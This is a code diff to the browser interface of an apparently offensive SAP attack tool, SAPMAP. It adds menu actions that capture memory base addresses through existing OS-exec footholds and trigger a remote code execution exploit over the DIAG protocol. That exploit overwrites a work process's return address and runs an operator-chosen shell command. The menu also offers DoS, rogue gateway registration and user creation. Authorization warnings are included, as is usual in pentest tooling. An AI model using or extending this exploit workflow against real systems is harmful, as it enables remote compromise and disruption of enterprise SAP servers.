@@ -1264,6 +1264,8 @@ body {
       <div class="ctx-item" data-action="betrusted">&#128272; Betrusted — Inject Trusted IP (10KBLAZE)</div>
       <div class="ctx-item" data-action="create_user_betrusted">&#128272; Create User (10KBLAZE Full Chain)</div>
       <div class="ctx-item" data-action="exploit_cve_44756_dos">&#9889; Trigger CVE-2026-44756 DoS (crashes ICM worker)</div>
+      <div class="ctx-item" data-action="capture_cve_44756_bases">&#128270; Capture CVE-2026-44756 bases (recon-only, via OS-exec)</div>
+      <div class="ctx-item" data-action="exploit_cve_44756_diag_rce">&#9889; Trigger CVE-2026-44756 DIAG RCE (arbitrary command)</div>
       <div class="ctx-item" data-action="exploit_cve_58240_register">&#9889; Register Rogue ASCS Gateway (CVE-2026-58240)</div>
       <div class="ctx-item" data-action="exploit_cve_58240_unregister">&#128245; Unregister Rogue ASCS Gateway (cleanup)</div>
       <div class="ctx-item" data-action="create_user_java">&#128100; Create User (Java UME)</div>
@@ -6000,6 +6002,13 @@ function showCtxMenu(e, sid) {
     'check_cve_44756':              isAbapStack || isWebDispatcher,
     // DoS trigger available once the check has flagged an ICM port.
     'exploit_cve_44756_dos':        hasCve44756Endpoint,
+    // Base capture only makes sense on Linux ABAP / dual-stack nodes
+    // AND requires a check to have flagged the target as vulnerable
+    // (otherwise there is no reason to burn OS-exec traffic).
+    'capture_cve_44756_bases':      hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
+    // DIAG RCE requires a vulnerable verdict; recon-values are prompted
+    // for or auto-captured at trigger time.
+    'exploit_cve_44756_diag_rce':   hasCve44756Endpoint && !!(n && n.cve_2026_44756_vulnerable),
     'exploit_cve_58240_register':   hasCve58240Check,      // need check to have flagged opcodes present
     'exploit_cve_58240_unregister': hasCve58240Registered, // only after we've actually registered
     'check_cve_6287':        isJavaStack,             // Java-only RECON check
@@ -6306,6 +6315,8 @@ function showCtxMenu(e, sid) {
     'check_cve_58240':       'Only applicable to ABAP / double-stack systems (MS is an ABAP kernel component)',
     'check_cve_44756':              'Only applicable to systems with an ICM (ABAP / double-stack / Web Dispatcher)',
     'exploit_cve_44756_dos':        'Run "Check CVE-2026-44756" first — no ICM port on record',
+    'capture_cve_44756_bases':      'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
+    'exploit_cve_44756_diag_rce':   'Run "Check CVE-2026-44756" and confirm the target is vulnerable first',
     'exploit_cve_58240_register':   'Run "Check CVE-2026-58240" first — need a target where the opcode family is recognised',
     'exploit_cve_58240_unregister': 'Nothing to clean up — no rogue ASCS gateway has been registered from this session',
     'check_cve_6287':        'Only applicable to Java / double-stack systems',
@@ -6608,6 +6619,11 @@ function showCtxMenu(e, sid) {
     // on a node we haven't fingerprinted yet.
     'check_cve_44756':                !(isAbapStack || isWebDispatcher),
     'exploit_cve_44756_dos':          !hasCve44756Endpoint,
+    // The RCE-track actions live under Exploitation.  Hide them until
+    // the check has flagged the node as vulnerable — showing them on
+    // patched or unchecked nodes just clutters the menu.
+    'capture_cve_44756_bases':        !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
+    'exploit_cve_44756_diag_rce':     !(hasCve44756Endpoint && n && n.cve_2026_44756_vulnerable),
     'exploit_cve_58240_register':     !hasCve58240Check,
     'exploit_cve_58240_unregister':   !hasCve58240Registered,
     'analyse_capabilities':       !isAbapStack,
@@ -7993,6 +8009,96 @@ async function ctxAction(action) {
         + '✅ Confirm ONLY if you have written authorization to test ' + sid + '.\n\n'
         + 'Proceed?')) break;
       await api('POST', `node/${sid}/exploit_cve_2026_44756_dos`, {confirm: true});
+      break;
+    }
+    case 'capture_cve_44756_bases': {
+      const nn = (mapState.nodes || {})[sid];
+      if (!nn) { showToast('Node not found', 'warn'); break; }
+      const info =
+        'CVE-2026-44756 base capture (recon-only)\n\n'
+        + 'SAPMAP will use its existing OS-exec channel '
+        + '(SXPG / GW SAPXPG / SAPControl OSExecute / CTCWebService / '
+        + 'CVE-2025-31324 shell) to read /proc/<wp_pid>/maps on the '
+        + 'target and extract the disp+work and libc bases.\n\n'
+        + 'No exploit is fired. Nothing crashes. The bases are cached '
+        + 'on the node so the DIAG RCE action can reuse them without '
+        + 'another exec round-trip.\n\n'
+        + 'Requires an OS-exec primitive to already be available for '
+        + sid + '.\n\nProceed?';
+      if (!confirm(info)) break;
+      await api('POST', `node/${sid}/exploit_cve_2026_44756_capture_bases`, {});
+      break;
+    }
+    case 'exploit_cve_44756_diag_rce': {
+      const nn = (mapState.nodes || {})[sid];
+      if (!nn) { showToast('Node not found', 'warn'); break; }
+      // Assemble the operator form — command, override bases, rdx.
+      const defaultCmd = 'id > /tmp/sapmap_cve_44756_proof.txt';
+      const cachedDw   = nn.cve_2026_44756_dw_base   || '';
+      const cachedLibc = nn.cve_2026_44756_libc_base || '';
+      const cachedRdx  = nn.cve_2026_44756_session_rdx || '';
+      const warning =
+        '⚠️ DESTRUCTIVE — CVE-2026-44756 DIAG RCE\n\n'
+        + 'This will:\n'
+        + '  • Send a crafted Extended Passport over the SAP DIAG protocol\n'
+        + '  • Overwrite the saved return address of a work process on ' + sid + '\n'
+        + '  • Execute an attacker-controlled shell command via a two-stage COP chain\n'
+        + '  • Kill the delivering work process (SAP re-forks it within seconds)\n\n'
+        + '❌ DO NOT run against production systems.\n'
+        + '✅ Confirm ONLY if you have written authorization to test ' + sid + '.\n\n'
+        + 'You will be prompted for the command to run, and — if not already '
+        + 'cached on the node — for the per-instance recon values (dw_base, '
+        + 'libc_base, rdx).\n\n'
+        + 'Proceed?';
+      if (!confirm(warning)) break;
+      const command = prompt('Shell command to run on the target (via system()):',
+                              defaultCmd);
+      if (command === null) break;
+      // Bases: only prompt if not cached.
+      let dw_base_hex = cachedDw;
+      if (!dw_base_hex) {
+        const v = prompt(
+          'disp+work text base (hex) — leave blank to auto-capture via OS-exec.\n'
+          + 'Format: 0x555555554000 or 555555554000.',
+          '');
+        if (v === null) break;
+        dw_base_hex = v.trim();
+      }
+      let libc_base_hex = cachedLibc;
+      if (!libc_base_hex) {
+        const v = prompt(
+          'libc text base (hex) — leave blank to auto-capture via OS-exec.',
+          '');
+        if (v === null) break;
+        libc_base_hex = v.trim();
+      }
+      let rdx_hex = cachedRdx;
+      if (!rdx_hex) {
+        const v = prompt(
+          'Session-buffer landing address rdx (hex) — REQUIRED.\n\n'
+          + 'This value is per-instance and cannot be derived remotely without '
+          + 'a live ptrace attach.  Measure it once with:\n'
+          + '  tools/cve-2026-44756/find_rdx.py <wp_pid>\n'
+          + 'running on the target as <sid>adm (or root).\n\n'
+          + 'Format: 0x7976338EC35D',
+          '');
+        if (v === null) break;
+        rdx_hex = v.trim();
+        if (!rdx_hex) {
+          showToast('rdx is required — cannot deliver DIAG RCE without it',
+                     'warn');
+          break;
+        }
+      }
+      const body = {
+        confirm:       true,
+        command:       command || defaultCmd,
+        dw_base_hex:   dw_base_hex,
+        libc_base_hex: libc_base_hex,
+        rdx_hex:       rdx_hex,
+        auto_capture:  true,
+      };
+      await api('POST', `node/${sid}/exploit_cve_2026_44756_diag_rce`, body);
       break;
     }
     case 'exploit_cve_58240_register': {
